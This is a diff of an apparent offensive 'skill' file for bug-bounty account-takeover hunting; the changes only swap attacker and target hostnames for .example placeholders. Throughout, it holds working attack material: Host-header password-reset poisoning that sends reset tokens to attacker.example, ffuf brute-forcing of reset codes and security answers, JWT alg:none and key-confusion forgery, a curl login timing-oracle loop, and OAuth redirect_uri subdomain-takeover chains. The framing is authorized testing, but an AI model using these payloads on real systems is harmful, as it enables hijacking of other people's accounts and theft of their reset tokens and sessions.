@@ -11,23 +11,23 @@ report_count: 7
 ### Path 1: Password Reset Poisoning (Host-Header)
 ```bash
 POST /forgot-password HTTP/1.1
-Host: attacker.com                 # primary Host swap
+Host: attacker.example                 # primary Host swap
 # OR keep real Host and add one of:
-X-Forwarded-Host: attacker.com
-X-Host: attacker.com
-X-Forwarded-Server: attacker.com
-# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com
+X-Forwarded-Host: attacker.example
+X-Host: attacker.example
+X-Forwarded-Server: attacker.example
+# OR dual-Host smuggling:  Host: target.example\r\nHost: attacker.example
 
 email=victimB@company.com
 ```
-The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
-**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.
+The reset mailer builds the link from the request Host header → link points to `attacker.example/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
+**False-positive killer:** many apps put `attacker.example` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.
 
 ### Path 2: Reset Token in Referer / Open-Redirect Leak
 ```
 GET /reset-password?token=ABC123
 → page loads third-party resource: <script src="https://analytics.com/t.js">
-→ browser sends  Referer: https://target.com/reset-password?token=ABC123
+→ browser sends  Referer: https://target.example/reset-password?token=ABC123
 → token exfiltrated to every off-origin host the page calls
 ```
 Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.
@@ -35,7 +35,7 @@ Also test reset pages that 302 to an open redirect carrying the token in the URL
 ### Path 3: Predictable / Weak Reset Tokens
 ```bash
 # 6-digit numeric OTP-style reset code, no rate limit:
-ffuf -u "https://target.com/api/reset/verify" -X POST \
+ffuf -u "https://target.example/api/reset/verify" -X POST \
   -H "Content-Type: application/json" \
   -d '{"email":"victimB@company.com","code":"FUZZ"}' \
   -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
@@ -55,7 +55,7 @@ Cross:   does B's token reset A's password if you swap the userid/email param? =
 ```bash
 PUT /api/user/email HTTP/1.1
 Cookie: session=ATTACKER_A_SESSION
-{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
+{"new_email":"attacker@evil.example"}     # no current_password, no OTP, no email-confirm
 ```
 If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.
 
@@ -66,7 +66,7 @@ python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='
 # send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
 #
 # (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
-curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
+curl -s https://target.example/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
 # convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
 #
 # (c) weak HMAC secret: crack offline
@@ -85,7 +85,7 @@ Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token le
 #
 # (b) login oracle to find a valid password without an existing cookie — measure response delta:
 for p in $(cat candidates.txt); do
-  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
+  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.example/login)
   printf '%s\t%s\n' "$t" "$p"
 done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
 ```
@@ -94,7 +94,7 @@ A no-step-up password-change endpoint is the **persistence multiplier**: cookie 
 ### Path 8: Social-Recovery / Security-Question Abuse
 ```bash
 # Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
-ffuf -u "https://target.com/account/recover/answer" -X POST \
+ffuf -u "https://target.example/account/recover/answer" -X POST \
   -H "Content-Type: application/json" \
   -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
   -w common-answers.txt -mc 200 -fr "incorrect" -t 5
@@ -105,10 +105,10 @@ Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are
 
 ### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
 ```bash
-# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
-GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
+# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.example subdomains?
+GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.example/cb&response_type=code
 # (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
-dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
+dig +short staging.target.example    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
 # (c) claim that host on the cloud provider, serve a callback that logs the ?code=
 # (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
 ```
@@ -130,11 +130,11 @@ A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a p
 
 ## Related Skills & Chains
 
-- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
+- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.example"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
 - **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
-- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
+- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.example`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.example` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
 - **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
-- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
+- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.example` → mailer builds the link from the request Host → link points to `attacker.example/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
 - **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
 - **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
 - **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.
